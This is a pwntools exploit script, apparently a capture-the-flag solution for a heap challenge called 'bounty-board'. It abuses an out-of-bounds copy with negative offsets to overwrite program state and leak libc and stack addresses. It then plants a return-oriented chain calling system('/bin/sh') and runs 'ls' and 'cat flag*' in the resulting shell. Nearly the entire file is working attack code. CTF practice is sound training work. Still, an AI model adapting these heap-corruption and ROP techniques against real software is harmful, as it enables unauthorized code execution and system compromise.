from pwn import *

exe = './copy_patched'

(dname, dport) = ("/app/run", 1337)
(host, port) = ("bounty-board.chal.pwni.ng", 1337)

# ==================[START DEFINIITONS]======================


def start(argv=[], *a, **kw):
    # RUN AS ROOT  <VIS BREAKS THOUGH, SO BEWARE>
    if args.DOCKER:
        proc = remote("localhost", dport)
        time.sleep(1)
        pid = int(process(["pgrep", "-fx", dname]).recvall().strip().decode())
        gdb.attach(pid, gdbscript, exe=exe)
        return proc

    # DEBUGGING WITH GDB FOR LOCAL
    elif args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
        # RUNNING FOR REMOTE
    elif args.RE:
        return remote(host, port)
        # NORMAL RUNS
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = '''
b *0x5555555553fd
'''.format(**locals())

context.terminal = ["gnome-terminal", "--"]
# context.log_level = "debug"

# ====================[EXPANSIONS]=========================

se = lambda data: p.send(data)
sl = lambda data: p.sendline(data)
sa = lambda ip, op: p.sendafter(ip, op)
sla = lambda ip, op: p.sendlineafter(ip, op)
rvu = lambda data: p.recvuntil(data)
rvl = lambda: p.recvline()
rv = lambda nbyts: p.recv(nbyts)
pop = lambda: p.interactive()

# >>>>>>>>>>>>>>>>[EXPLOIT STARTS HERE]>>>>>>>>>>>>>>>>>>>>

hpofft = 0x3fe16000


def alloc(size, data):
    sla(b">", b"0")
    sla(b"size:", str(size - 1).encode())
    sl(data[:-1:])


def copy(dst, src, ln):
    sla(b">", b"1")
    sla(b"dst:", str(dst).encode())
    sla(b"src:", str(src).encode())
    sla(b"len:", str(ln).encode())


def bye():
    sla(b">", b"2")


def calc(chnkofft):
    global hpofft
    offt = (hpofft + chnkofft) - (0x90)
    return -offt


def Run():
    global p
    p = start()

    alloc(0x88, b"z" * 0x88)  # 1 0x2a0
    alloc(0x18, (b"a" * 0x18))  # 2 0x330
    alloc(0x88, (b"b" * 0x88))  # 3 0x350
    alloc(0x88, (b"\xe8" * 0x88))  # 4 0x3e0
    alloc(0x88, (b"d" * 0x88))  # 5 0x470
    alloc(0x88, (b"e" * 0x88))  # 6
    alloc(0x38, (b"f" * 0x38))  # 7
    alloc(0x88, (b"g" * 0x88))  # 8

    # STEP 1 : COPY STDOUT ADDRESS ONTO THE BSS

    # hpofft = int(input("Enter heap : "),0x10)

    # DUPLICATING HEAP POINTERS TO RESTORE IT LATER
    copy(1, 0, calc(0x2a0))
    copy(1, 0, calc(0x2a0) + 0xa0)

    # GETTING STDOUT INTO THE HEAP ARRAY
    copy(1, 0, calc(0x2a0) - 0x30)
    # OVERWRITE NOTE_COUNT
    copy(1, 2, calc(0x330))
    # COPY STDOUT PTR INTO HEAP
    copy(1, 2, 0x100)

    # COPY UP THE SIZES SO THAT
    # WE HAVE A VALID CHUNK TO COPY DATA INTO
    copy(0, 1, calc(0x470) + 0x50)
    copy(0, 2, 0x50)

    # COPYING STDOUT AND STACK POINTERS
    copy(1, 2, 0x10)

    # SETTING UP SIZES
    stdidx = ((hpofft - 0x30) + 0x500) // 0x8
    print("IDX : ", stdidx)

    copy(1, 0x15, 0x1)
    copy(stdidx, 0x15, 0x1)

    # UNUSED HEAP POINTERS 4
    rv(0x1)
    rv(0x5)
    libc = u64(rv(8)) - 0x205710
    print("[+] LIBC : ", hex(libc))

    rv(0x90)
    stack = u64(rv(8)) - 0x128
    print("[+] STACK : ", hex(stack))

    # copy(1,0,calc(0x2a0) + 0xa0*2)
    # context.log_level = "DEBUG"

    copy(0x7, 0x6, calc(0x500) - 0xa0)

    system = libc + 0x58750
    binsh = libc + 0x1cb42f
    poprdi = libc + 0x10f75b

    ropchain = (p64(poprdi) + p64(binsh) + p64(poprdi + 1) + p64(system))
    # SETUP FOR THE FINAL ALLOC
    alloc(0x88, b"a" * 0x88)  # 1
    alloc(0x28, b"a" * 0x28)  # 2
    alloc(0x88, b"a" * 0x88)  # 2
    alloc(0x88, ropchain + b"\x00")
    alloc(0x88, b"a" * 0x10 + p64(poprdi + 1))
    alloc(0x88, b"a" * 0x8 + p64(binsh))
    alloc(0x88, p64(poprdi) + b"\x00")
    alloc(0x88, p64(stack + 0x8) + 0x78 * b"a")

    # OVERWRITE SIZE
    stackidx = ((hpofft - 0x30) + 0x9f0) // 0x8
    copy(0x1, 0x0, calc(0x670))
    copy(0x1, 0x0, calc(0x670) - 0x60)
    copy(stackidx, 0x15, 0x80)


i = 0
while (True):
    i += 1
    try:
        print(f"ITERATION {i}")
        Run()
        sl(b"2")
        break
    except EOFError:
        p.close()
        print("FAILED")

sl(b"ls")
sl(b"cat flag*")
pop()
